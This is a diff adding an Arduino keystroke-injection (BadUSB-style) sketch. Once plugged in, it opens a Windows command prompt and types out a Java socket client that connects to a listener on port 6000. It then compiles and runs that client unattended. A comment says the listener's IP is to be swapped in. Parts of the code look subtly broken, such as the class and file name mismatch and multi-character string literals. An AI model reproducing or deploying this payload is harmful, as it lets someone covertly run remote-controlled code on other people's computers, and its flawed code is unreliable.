@@ -1,0 +1,153 @@
+void setup() {
+  Keyboard.begin();
+  delay(10000);//延时
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(200); 
+  Keyboard.print('r');
+  delay(200); 
+  Keyboard.release(KEY_LEFT_GUI);
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  delay(200); 
+  //=========================Run==========================
+  Keyboard.println("CMD");
+  delay(1000);
+ 
+  Keyboard.println("ECHO import java.awt.*; >> client.java");
+  delay(100);
+  Keyboard.println("ECHO import java.awt.event.*;>> client.java");
+  delay(100);
+  Keyboard.println("ECHO import java.io.*;>> client.java");
+  delay(100);
+  Keyboard.println("ECHO import java.net.*;>> client.java");
+  delay(100);
+  Keyboard.println("ECHO public class Client extends Frame implements ActionListener { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     Label label = new Label(\"指令\"); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     Panel panel = new Panel(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     TextField tf = new TextField(20); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     TextArea ta = new TextArea(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     Socket client; >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     InputStream in; >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     OutputStream out; >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     public Client() { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         super(\"客户机\"); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         setSize(250, 250); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         panel.add(label); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         panel.add(tf); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         tf.addActionListener(this); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         add(\"South\", panel); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         add(\"Center\", ta); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         addWindowListener(new WindowAdapter() { //退出 >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 public void windowClosing(WindowEvent e) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                     System.exit(0); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             }); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         show(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         try { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             client = new Socket(InetAddress.getLocalHost(), 6000); //向6000端口发出客户请求 >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             ta.append(\"服务器是:\" + client.getInetAddress().getHostAddress() + \"\n\n\"); >> client.java");  //需要手动替换监听主机IP、端口，这里只给出思路
+  delay(100);
+  Keyboard.println("ECHO             in = client.getInputStream(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             out = client.getOutputStream(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         } catch (IOException ioe) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         while (true) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             try { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 byte[] buf = new byte[256]; >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 in.read(buf); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 String str = new String(buf); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO                 ta.append(str + \"\n\"); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             catch (IOException e) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     public void actionPerformed(ActionEvent e) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         try { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             String str = tf.getText(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             byte[] buf = str.getBytes(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             tf.setText(null); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             out.write(buf); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO             ta.append(\"\n指令:\" + str + \"\n\"); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         } catch (IOException ioe) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     public static void main(String[] args) { >> client.java");
+  delay(100);
+  Keyboard.println("ECHO         new Client(); >> client.java");
+  delay(100);
+  Keyboard.println("ECHO     } >> client.java");
+  delay(100);
+  Keyboard.println("ECHO } >> client.java");
+  delay(100);
+
+  Keyboard.println("javac client.java");  //编译java文件
+  delay(6000);
+  Keyboard.println("java client");  //执行java文件
+  delay(300);
+  Keyboard.press(KEY_LEFT_GUI);
+  delay(200); 
+  Keyboard.print('r');
+  delay(200); 
+  Keyboard.release(KEY_LEFT_GUI);
+  delay(200);
+  Keyboard.println('CMD');
+  delay(600);
+  Keyboard.println('EXIT');
+  //======================================================
+  Keyboard.press(KEY_CAPS_LOCK);
+  Keyboard.release(KEY_CAPS_LOCK);
+  Keyboard.end();//结束键盘通讯 
+}
+
+void loop() {
+}
